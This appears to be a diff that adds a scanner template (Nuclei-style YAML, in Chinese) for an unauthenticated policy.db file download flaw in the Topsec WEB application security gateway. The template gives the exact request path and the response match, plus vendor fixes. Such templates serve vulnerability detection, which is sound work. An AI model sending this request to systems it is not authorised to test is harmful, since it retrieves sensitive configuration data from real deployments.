@@ -1,0 +1,29 @@
+id: WEB-policy_db-Downlaod
+info:
+  name: 天融信WEB应用安全网关 policy.db 文件下载漏洞
+  author:
+  - l0ne1y
+  description: |-
+    天融信WEB应用安全网关系统db文件下载漏洞
+    天融信WEB应用安全网关系统是一款针对“网站型”服务器量身定制的产业化产品。
+
+    天融信WEB应用安全网关系统存在db文件下载漏洞，攻击者可通过下载policy.db文件获取系统敏感信息
+  severity: medium
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.topsec.com.cn/
+
+    临时修复方案：
+    1、前后端同时对用户输入信息进行校验，双重验证机制。
+    2、调用功能前验证用户是否有权限调用相关功能。
+    3、禁止外部用户对db文件的访问。
+    4、将敏感信息进行加密存储，非必要不可发送前端。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - status_code==200 && contains(body,"WebPolicy")
+  path:
+  - '{{BaseURL}}/db/policy.db'
+  method: GET
